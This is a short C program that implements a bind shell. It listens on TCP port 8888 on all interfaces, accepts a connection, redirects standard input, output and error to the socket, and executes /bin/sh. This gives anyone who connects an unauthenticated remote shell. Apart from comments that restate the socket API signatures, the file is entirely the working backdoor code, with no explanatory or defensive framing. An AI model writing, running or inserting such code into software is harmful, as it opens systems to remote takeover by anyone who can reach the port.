#include<stdio.h> //printf
#include<string.h>    //strlen
#include<sys/socket.h>    //socket
#include<arpa/inet.h> //inet_addr

int main(int argc , char *argv[]){

    int sock;
    int clntSock;
    struct sockaddr_in server;
    struct sockaddr_in client;
 
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_family = AF_INET;
    server.sin_port = htons( 8888 );
 
    sock = socket(AF_INET , SOCK_STREAM , 0);
    //int bind(int socket, struct sockaddr *localAddress, unsigned int addressLength) 
    bind(sock, (struct sockaddr *)&server, sizeof(server));

    //int listen(int socket, int queueLimit)
    listen(sock, 0);

    //int accept(int socket, struct sockaddr *clientAddress, unsigned int *addressLength)
    clntSock = accept(sock, NULL, NULL);
    
    dup2(clntSock, 0);
    dup2(clntSock, 1);
    dup2(clntSock, 2);

    execve("/bin/sh", 0, 0);

    return 0;
}
